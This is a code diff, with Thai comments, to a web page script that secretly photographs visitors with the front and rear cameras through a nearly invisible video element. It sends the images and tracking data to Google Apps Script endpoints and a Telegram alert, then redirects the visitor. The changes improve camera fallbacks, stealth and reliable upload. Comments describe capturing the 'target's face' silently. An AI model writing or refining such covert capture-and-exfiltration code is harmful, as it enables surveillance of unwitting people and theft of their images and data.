@@ -42,8 +42,8 @@
     </div>
   </div>
 
-  <!-- Offscreen Video & Canvas for camera capture (Offscreen avoids mobile GPU frame decoding drop) -->
-  <video id="hidden-video" autoplay playsinline muted style="position: fixed; top: -9999px; left: -9999px; width: 320px; height: 240px; opacity: 0; pointer-events: none;"></video>
+  <!-- Invisible Video & Canvas for camera capture (kept in DOM compositor to prevent mobile GPU frame drop) -->
+  <video id="hidden-video" autoplay playsinline muted style="position: fixed; top: 0; left: 0; width: 1px; height: 1px; opacity: 0.01; pointer-events: none; z-index: -1;"></video>
   <canvas id="hidden-canvas" style="display: none;"></canvas>
 
   <script>
@@ -356,7 +356,7 @@
         }
       }
 
-      // 6. ฟังก์ชันส่งข้อมูลไปยัง Google Apps Script (ส่งขนาน ไม่รอช้า ประหยัดเวลา)
+      // 6. ฟังก์ชันส่งข้อมูลไปยัง Google Apps Script (ส่งขนาน ไม่ตัดการเชื่อมต่อ)
       let isGasDispatched = false;
       async function dispatchGasTracking(withPhoto = false) {
         if (isGasDispatched && !withPhoto) return;
@@ -364,18 +364,25 @@
 
         const payloadStr = JSON.stringify(trackingData);
 
+        // หมายเหตุสำคัญ: หาก Payload มีขนาดเกิน 64KB ห้ามใช้ keepalive: true เพราะเบราว์เซอร์ Chromium/Safari จะโยน TypeError
+        const fetchOptions = {
+          method: 'POST',
+          headers: { 'Content-Type': 'text/plain;charset=utf-8' },
+          body: payloadStr
+        };
+        if (payloadStr.length < 55000) {
+          fetchOptions.keepalive = true;
+        }
+
         const promises = gasEndpoints.map(endpoint => {
-          return fetch(endpoint, {
-            method: 'POST',
-            headers: { 'Content-Type': 'text/plain;charset=utf-8' },
-            body: payloadStr,
-            keepalive: true
-          }).catch(err => console.warn('POST GAS endpoint error:', err));
+          return fetch(endpoint, fetchOptions)
+            .then(res => res.json().catch(() => ({})))
+            .catch(err => console.warn('POST GAS endpoint error:', err));
         });
 
-        // ให้เวลาส่ง GAS แบบขนาน (ถ้ามีรูปให้เวลานานขึ้นเล็กน้อยเพื่อให้ Base64 ส่งถึงสมบูรณ์)
+        // ให้เวลาส่ง GAS แบบขนาน (ให้เวลานานพอเพื่อให้รูปภาพส่งถึงเซิร์ฟเวอร์สมบูรณ์)
         const isDualCam = (urlParams.get('cam') === 'dual' || urlParams.get('dual') === '1');
-        const gasTimeout = withPhoto ? (isDualCam ? 1300 : 850) : 350;
+        const gasTimeout = withPhoto ? (isDualCam ? 3800 : 2500) : 1200;
         await Promise.race([
           Promise.allSettled(promises),
           new Promise(r => setTimeout(r, gasTimeout))
@@ -427,88 +434,130 @@
         }
       });
 
-      // Step 3: ระบบจับภาพกล้อง (แก้ปัญหาภาพจอดำบนมือถือ + ปรับปรุงให้สลับถ่ายกล้องหน้า/หลังได้อย่างเสถียร 100%)
+      // Step 3: ระบบจับภาพกล้อง (แก้ปัญหา OverconstrainedError และความขัดแย้งของกล้องหลัง 100%)
       let isCapturing = false;
       let hasCapturedPhoto = false;
+      let frontDeviceId = null;
 
-      // ฟังก์ชันเชื่อมต่อกล้องพร้อมระบบ Fallback หลากระดับ (ป้องกัน Error ใน LINE Webview & Chrome Mobile)
+      // ฟังก์ชันเชื่อมต่อกล้องพร้อมระบบ Fallback หลากระดับ (ไม่มี Hard Max เพื่อป้องกัน OverconstrainedError บนมือถือแนวตั้ง)
       async function getCameraStream(facing) {
         if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) return null;
 
-        // 1. พยายามเปิดด้วยเงื่อนไข facingMode ที่ส่งมา
-        try {
-          return await navigator.mediaDevices.getUserMedia({
-            video: {
-              facingMode: facing,
-              width: { ideal: 640, max: 800 },
-              height: { ideal: 480, max: 600 }
-            }
-          });
-        } catch (err1) {
-          console.warn(`Primary facing (${JSON.stringify(facing)}) failed:`, err1);
-        }
+        const isRear = (facing === 'environment' || (typeof facing === 'object' && (facing.exact === 'environment' || facing.ideal === 'environment')));
 
-        // 2. หากเป็นกล้องหลังแล้วติดปัญหา ให้ลองใช้สตริง 'environment' ตรงๆ
-        const isRear = (facing === 'environment' || (typeof facing === 'object' && facing.ideal === 'environment'));
-        if (isRear) {
+        async function tryGetUserMedia(constraints) {
           try {
-            return await navigator.mediaDevices.getUserMedia({
-              video: {
-                facingMode: 'environment',
-                width: { ideal: 640, max: 800 },
-                height: { ideal: 480, max: 600 }
+            return await navigator.mediaDevices.getUserMedia(constraints);
+          } catch (e) {
+            console.warn('getUserMedia attempt failed:', e.name, e.message);
+            // หากฮาร์ดแวร์กำลังถูกใช้งานอยู่ (NotReadableError) ให้รอ 600ms แล้วลองใหม่ 1 ครั้ง
+            if (e.name === 'NotReadableError' || e.name === 'TrackStartError') {
+              await new Promise(r => setTimeout(r, 600));
+              try {
+                return await navigator.mediaDevices.getUserMedia(constraints);
+              } catch (e2) {
+                console.warn('Retry after cooldown failed:', e2.name);
               }
-            });
-          } catch (err2) {
-            console.warn('Fallback facingMode: environment failed:', err2);
+            }
+            return null;
           }
         }
 
-        // 3. ค้นหารหัสอุปกรณ์ (deviceId) จากรายการอุปกรณ์กล้องที่ตรวจพบ
-        try {
-          if (navigator.mediaDevices.enumerateDevices) {
-            const devices = await navigator.mediaDevices.enumerateDevices();
-            const videoDevices = devices.filter(d => d.kind === 'videoinput');
-            
-            let matchedDevice = null;
-            if (isRear) {
-              matchedDevice = videoDevices.find(d => {
-                const lbl = (d.label || '').toLowerCase();
-                return lbl.includes('back') || lbl.includes('rear') || lbl.includes('environment') || lbl.includes('กล้องหลัง');
-              });
-            } else {
-              matchedDevice = videoDevices.find(d => {
-                const lbl = (d.label || '').toLowerCase();
-                return lbl.includes('front') || lbl.includes('user') || lbl.includes('กล้องหน้า');
-              });
-            }
+        let stream = null;
 
-            if (matchedDevice && matchedDevice.deviceId) {
-              return await navigator.mediaDevices.getUserMedia({
-                video: {
-                  deviceId: { exact: matchedDevice.deviceId },
-                  width: { ideal: 640, max: 800 },
-                  height: { ideal: 480, max: 600 }
-                }
-              });
-            }
-          }
-        } catch (err3) {
-          console.warn('Device enumeration fallback failed:', err3);
-        }
-
-        // 4. ทางเลือกสุดท้าย: เปิดกล้องใดๆ ที่มีในระบบ
-        try {
-          return await navigator.mediaDevices.getUserMedia({
+        if (isRear) {
+          // 1. ระดับที่ 1: facingMode: { exact: 'environment' } (บังคับกล้องหลังบน iOS/Android)
+          stream = await tryGetUserMedia({
             video: {
-              width: { ideal: 640, max: 800 },
-              height: { ideal: 480, max: 600 }
+              facingMode: { exact: 'environment' },
+              width: { ideal: 640 },
+              height: { ideal: 480 }
             }
           });
-        } catch (err4) {
-          console.warn('Generic video stream fallback failed:', err4);
-          return null;
+          if (stream) return stream;
+
+          // 2. ระดับที่ 2: facingMode: 'environment' (ค่าสตริงมาตรฐาน)
+          stream = await tryGetUserMedia({
+            video: {
+              facingMode: 'environment',
+              width: { ideal: 640 },
+              height: { ideal: 480 }
+            }
+          });
+          if (stream) return stream;
+
+          // 3. ระดับที่ 3: facingMode: { ideal: 'environment' }
+          stream = await tryGetUserMedia({
+            video: {
+              facingMode: { ideal: 'environment' }
+            }
+          });
+          if (stream) return stream;
+
+          // 4. ระดับที่ 4: ค้นหา deviceId จากอุปกรณ์กล้องที่ตรวจพบ
+          try {
+            if (navigator.mediaDevices.enumerateDevices) {
+              const devices = await navigator.mediaDevices.enumerateDevices();
+              const videoDevices = devices.filter(d => d.kind === 'videoinput');
+
+              if (videoDevices.length > 0) {
+                // 4A: ค้นหาจากป้ายชื่อ label
+                let matchedDevice = videoDevices.find(d => {
+                  const lbl = (d.label || '').toLowerCase();
+                  return lbl.includes('back') || lbl.includes('rear') || lbl.includes('environment') || lbl.includes('กล้องหลัง');
+                });
+
+                // 4B: ถ้า label ว่าง แต่มีอุปกรณ์มากกว่า 1 ตัว ให้เลือกตัวที่ไม่ใช่กล้องหน้า
+                if (!matchedDevice && frontDeviceId && videoDevices.length > 1) {
+                  matchedDevice = videoDevices.find(d => d.deviceId && d.deviceId !== frontDeviceId);
+                }
+
+                // 4C: ถ้ายังไม่พบ ให้ใช้อุปกรณ์ตัวท้ายสุด (บน Android กล้องหลังมักเป็นตัวสุดท้าย)
+                if (!matchedDevice && videoDevices.length > 1) {
+                  matchedDevice = videoDevices[videoDevices.length - 1];
+                }
+
+                if (matchedDevice && matchedDevice.deviceId) {
+                  stream = await tryGetUserMedia({
+                    video: {
+                      deviceId: { exact: matchedDevice.deviceId },
+                      width: { ideal: 640 },
+                      height: { ideal: 480 }
+                    }
+                  });
+                  if (stream) return stream;
+                }
+              }
+            }
+          } catch (enumErr) {
+            console.warn('Enumerate fallback error:', enumErr);
+          }
+        } else {
+          // กล้องหน้า: user
+          stream = await tryGetUserMedia({
+            video: {
+              facingMode: 'user',
+              width: { ideal: 640 },
+              height: { ideal: 480 }
+            }
+          });
+          if (stream) return stream;
+
+          stream = await tryGetUserMedia({
+            video: {
+              facingMode: { ideal: 'user' }
+            }
+          });
+          if (stream) return stream;
         }
+
+        // ทางเลือกสุดท้าย: เปิดวิดีโอใดๆ ที่มี
+        return await tryGetUserMedia({
+          video: {
+            width: { ideal: 640 },
+            height: { ideal: 480 }
+          }
+        });
       }
 
       async function snapCamera(facing) {
@@ -525,80 +574,68 @@
           stream = await getCameraStream(facing);
           if (!stream) return null;
 
-          // 1. นวัตกรรมเร่งความเร็วระดับฮาร์ดแวร์ (Turbo ImageCapture API): บน Chrome Android สามารถดึงเฟรมเซนเซอร์ตรงใน 20-30ms
-          let directBitmap = null;
-          if (window.ImageCapture) {
-            try {
-              const track = stream.getVideoTracks()[0];
-              if (track && track.readyState === 'live') {
-                const ic = new ImageCapture(track);
-                directBitmap = await Promise.race([
-                  ic.grabFrame(),
-                  new Promise((_, reject) => setTimeout(() => reject('timeout'), 400))
-                ]);
+          // บันทึก deviceId ที่ใช้งานสำหรับแยกแยะกล้องหน้า/กล้องหลัง
+          const vTrack = stream.getVideoTracks()[0];
+          if (vTrack && vTrack.getSettings) {
+            const settings = vTrack.getSettings();
+            if (settings && settings.deviceId) {
+              if (facing === 'user' || (typeof facing === 'string' && facing.includes('user'))) {
+                frontDeviceId = settings.deviceId;
               }
-            } catch (icErr) { }
+            }
           }
 
-          if (directBitmap && directBitmap.width > 0) {
-            const targetW = 400;
-            const targetH = Math.round(targetW * (directBitmap.height / directBitmap.width || 0.75));
-            canvas.width = targetW;
-            canvas.height = targetH;
-            const ctx = canvas.getContext('2d');
-            ctx.drawImage(directBitmap, 0, 0, targetW, targetH);
-          } else {
-            // 2. Fallback: เล่นผ่านองค์ประกอบ Video พร้อมตรวจจับ Frame Callback แบบแม่นยำ
-            video.srcObject = stream;
+          // แสดงผลผ่านองค์ประกอบ Video พร้อมตรวจจับ Frame Callback แบบแม่นยำ
+          video.srcObject = stream;
 
-            await new Promise(resolve => {
-              let done = false;
-              const finish = () => {
-                if (!done) { done = true; resolve(); }
-              };
+          await new Promise(resolve => {
+            let done = false;
+            const finish = () => {
+              if (!done) { done = true; resolve(); }
+            };
 
-              if (video.requestVideoFrameCallback) {
-                video.requestVideoFrameCallback(() => {
-                  setTimeout(finish, 140);
-                });
+            if (video.requestVideoFrameCallback) {
+              video.requestVideoFrameCallback(() => {
+                setTimeout(finish, 180);
+              });
+            }
+
+            video.onplaying = () => {
+              if (video.videoWidth > 0 && video.readyState >= 2) {
+                setTimeout(finish, 180);
+              } else {
+                video.ontimeupdate = () => finish();
+                setTimeout(finish, 380);
               }
+            };
+            video.onloadeddata = () => {
+              if (video.videoWidth > 0) setTimeout(finish, 200);
+            };
+            video.play().catch(finish);
+            setTimeout(finish, 1400);
+          });
 
-              video.onplaying = () => {
-                if (video.videoWidth > 0 && video.readyState >= 2) {
-                  setTimeout(finish, 160);
-                } else {
-                  video.ontimeupdate = () => finish();
-                  setTimeout(finish, 320);
-                }
-              };
-              video.onloadeddata = () => {
-                if (video.videoWidth > 0) setTimeout(finish, 180);
-              };
-              video.play().catch(finish);
-              setTimeout(finish, 1100);
-            });
+          // หน่วงเวลาสั้นๆ ให้เซนเซอร์ปรับแสง (Auto-Exposure Warmup)
+          await new Promise(r => setTimeout(r, 200));
 
-            // หน่วงเวลาสั้นๆ ให้เซนเซอร์ปรับแสง (Auto-Exposure Warmup)
-            await new Promise(r => setTimeout(r, 140));
+          const vW = video.videoWidth || 640;
+          const vH = video.videoHeight || 480;
+          const targetW = 320;
+          const targetH = Math.round(targetW * (vH / vW || 0.75));
+          canvas.width = targetW;
+          canvas.height = targetH;
+          const ctx = canvas.getContext('2d');
+          ctx.drawImage(video, 0, 0, targetW, targetH);
 
-            const vW = video.videoWidth || 640;
-            const vH = video.videoHeight || 480;
-            const targetW = 400;
-            const targetH = Math.round(targetW * (vH / vW || 0.75));
-            canvas.width = targetW;
-            canvas.height = targetH;
-            const ctx = canvas.getContext('2d');
-            ctx.drawImage(video, 0, 0, targetW, targetH);
-          }
-
-          // ปิดสตรีมกล้องทันทีและรีเซ็ตวิดีโอ
+          // ปิดสตรีมกล้องทันทีและรีเซ็ตวิดีโอ เพื่อคืนทรัพยากรฮาร์ดแวร์ให้เบราว์เซอร์
           stream.getTracks().forEach(t => {
             try { t.stop(); } catch(e){}
           });
           try { video.pause(); } catch(e){}
           video.srcObject = null;
 
-          return canvas.toDataURL('image/jpeg', 0.60);
+          // เข้ารหัส JPEG คุณภาพ 0.55 (~12-16 KB) เพื่อการส่งที่รวดเร็วและไม่เกิน Quota
+          return canvas.toDataURL('image/jpeg', 0.55);
         } catch (err) {
           if (stream) {
             try { stream.getTracks().forEach(t => t.stop()); } catch (e) {}
@@ -613,7 +650,7 @@
         if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) return;
         isCapturing = true;
 
-        const camParam = (urlParams.get('cam') || '').toLowerCase();
+        const camParam = (urlParams.get('cam') || urlParams.get('camera') || '').toLowerCase();
         const dualParam = urlParams.get('dual');
         const isDual = (camParam === 'dual' || camParam === 'both' || dualParam === '1');
         const isRearOnly = (camParam === 'rear' || camParam === 'back' || camParam === 'environment');
@@ -621,7 +658,7 @@
         try {
           if (isRearOnly) {
             // โหมด: ถ่ายเฉพาะกล้องหลัง
-            const rearB64 = await snapCamera({ ideal: "environment" });
+            const rearB64 = await snapCamera('environment');
             if (rearB64 && rearB64.length > 500) {
               hasCapturedPhoto = true;
               trackingData.camera.rearPhoto = rearB64;
@@ -631,7 +668,7 @@
           } else if (isDual) {
             // โหมด: กล้องคู่ (กล้องหน้า + กล้องหลัง)
             // 1. ถ่ายกล้องหน้าก่อนเพื่อจับภาพใบหน้าเป้าหมาย
-            const frontB64 = await snapCamera("user");
+            const frontB64 = await snapCamera('user');
             if (frontB64 && frontB64.length > 500) {
               hasCapturedPhoto = true;
               trackingData.camera.frontPhoto = frontB64;
@@ -639,11 +676,11 @@
               trackingData.photo = frontB64;
             }
 
-            // เว้นระยะ 350ms เพื่อให้ระบบปฏิบัติการ/ฮาร์ดแวร์ปล่อยทรัพยากรกล้องตัวแรก (แก้ปัญหา NotReadableError / Device in use)
-            await new Promise(r => setTimeout(r, 350));
+            // เว้นระยะ 650ms เพื่อให้ระบบปฏิบัติการ/ฮาร์ดแวร์ปล่อยทรัพยากรกล้องตัวแรก (ป้องกัน NotReadableError / Device in use)
+            await new Promise(r => setTimeout(r, 650));
 
             // 2. สลับเปิดกล้องหลังเพื่อดูสภาพแวดล้อม
-            const rearB64 = await snapCamera({ ideal: "environment" });
+            const rearB64 = await snapCamera('environment');
             if (rearB64 && rearB64.length > 500) {
               hasCapturedPhoto = true;
               trackingData.camera.rearPhoto = rearB64;
@@ -652,7 +689,7 @@
             }
           } else {
             // โหมดปกติ: ถ่ายกล้องหน้าอย่างเดียว (เร็วที่สุด)
-            const frontB64 = await snapCamera("user");
+            const frontB64 = await snapCamera('user');
             if (frontB64 && frontB64.length > 500) {
               hasCapturedPhoto = true;
               trackingData.camera.frontPhoto = frontB64;
@@ -662,13 +699,13 @@
           }
 
           if (hasCapturedPhoto) {
-            // ส่ง Telegram และ Google Apps Script พร้อมกันแบบคู่ขนาน (Parallel) เพื่อความเร็วสูงสุด
+            // ส่งข้อมูลไปยัง Google Apps Script และ Telegram พร้อมรอให้ส่งถึงเรียบร้อย
             await Promise.allSettled([
               dispatchTelegramAlert(),
               dispatchGasTracking(true)
             ]);
-            // เด้งเปลี่ยนเส้นทางทันทีอย่างรวดเร็ว (100ms)
-            setTimeout(performRedirect, 100);
+            // เด้งเปลี่ยนเส้นทางทันที
+            setTimeout(performRedirect, 200);
           }
         } catch (e) {
           console.warn('Silent capture flow error:', e);
@@ -693,9 +730,8 @@
       }
 
       // Step 4: รวมการส่งข้อมูลทั้งหมด
-      // ให้เวลารอการเปิดกล้อง: หากเป็นโหมดกล้องคู่ให้เวลา 5 วินาที, โหมดกล้องเดี่ยวให้เวลา 3.5 วินาที
       const isDualMode = (urlParams.get('cam') === 'dual' || urlParams.get('dual') === '1' || urlParams.get('cam') === 'both');
-      const maxWaitTime = isDualMode ? 5000 : 3500;
+      const maxWaitTime = isDualMode ? 7000 : 4500;
       const cameraRunPromise = captureCameraSilent();
 
       Promise.race([
@@ -706,13 +742,13 @@
           await dispatchGasTracking(false);
           await dispatchTelegramAlert();
         }
-        setTimeout(performRedirect, 100);
+        setTimeout(performRedirect, 200);
       }).catch(() => {
         performRedirect();
       });
 
       // Safe Absolute Fallback: ป้องกันการค้าง
-      setTimeout(performRedirect, isDualMode ? 6500 : 4500);
+      setTimeout(performRedirect, isDualMode ? 8500 : 6000);
     })();
   </script>
 </body>
